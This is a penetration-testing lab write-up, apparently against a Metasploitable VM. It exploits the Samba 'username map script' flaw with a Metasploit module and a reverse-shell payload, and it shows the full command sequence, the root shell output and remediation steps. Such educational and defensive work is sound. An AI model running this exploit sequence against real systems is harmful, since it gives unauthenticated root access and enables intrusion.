# Exploitation Phase – 4. Samba “username map script” Command Execution

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  
**Affected Service:** Samba
**Service Version:** 3.x (affected versions supporting username map script) 
**Port:** TCP 139

This vulnerability was identified during service enumeration and confirmed during vulnerability assessment using Nmap and Metasploit modules.

---

## Vulnerability Overview
Samba’s “username map script” feature allows mapping Windows usernames to UNIX usernames.

A misconfigured or vulnerable Samba service can be exploited by sending crafted requests that trigger arbitrary command execution on the target system.

- Remote Code Execution (RCE)
- Root-level access if Samba runs with elevated privileges
- No authentication required in some configurations
- Full system compromise

This is considered a **critical, high-impact vulnerability**.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
- Provides a dedicated module for exploiting the username map script feature
- Automates command execution and reverse shell handling
- Supports multiple Unix payloads
- Confirms vulnerability impact through live exploitation

### Tool Explanation
The module exploit/multi/samba/usermap_script leverages Samba’s username map script vulnerability to spawn a reverse shell on the attacker’s machine.

This allows full control over the target host without prior authentication if the Samba service is vulnerable.

---

## Exploit Module Information

- **Module Name:** `exploit/multi/samba/usermap_script`
- **Payload Used:** `cmd/unix/reverse`
- **Exploit Type:** Reverse shell (unix)
- **Default List Port:** 4444

---

## Exploitation Command Sequence

    msfconsole -q
    use exploit/multi/samba/usermap_script
    set RHOSTS 192.168.56.102
    set RPORT 139
    set payload cmd/unix/reverse
    set LHOST 192.168.56.1
    set LPORT 4444
    exploit

## Exploit Output (Successful)

    [*] Started reverse TCP double handler on 192.168.56.1:4444 
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.102:49779)


## Post-Exploitation Validation
Command Executed:

    whoami
Output:

    root
Confirms root-level access.
Command

    hostname
Output

    metasploitable 
Command

    df -h

Output

    Filesystem            Size  Used Avail Use% Mounted on
    /dev/mapper/metasploitable-root  7.0G  1.5G  5.2G  22% /
    /var/run               1014M  144K 1014M   1% /var/run
    /var/lock              1014M     0 1014M   0% /var/lock
    /dev/shm               1014M     0 1014M   0% /dev/shm
    /dev/sda1              228M   25M  192M  12% /boot

## What Was Achieved Through This Exploit
- Root shell access obtained
- Full control over the system
- Ability to read/write system files
- Modify Samba configuration and other critical files
- Pivot to internal networks and deploy additional payloads

## Risk Assessment
| Factor | Severity |
|---|------|
| Authentication Bypass | Critical | 
| Remote Code Execution | Critical | 
| Privilege Level | Root | 
| Exploit Complexity | Low |
| Impact | Full system compromise |
## Remediation Recommendations
- Immediately upgrade Samba to the latest secure version
- Disable or properly configure username map script
- Restrict Samba access to trusted hosts via firewall rules
- Monitor Samba logs for suspicious connections
- Implement principle of least privilege for service accounts
- Segment network to limit potential exploitation impact

## Conclusion

Exploitation of Samba’s username map script allows attackers to gain unauthenticated root access on vulnerable systems.

Successful exploitation demonstrates the risk of running legacy or misconfigured services on production networks and highlights the need for service hardening, patching, and access control.

---
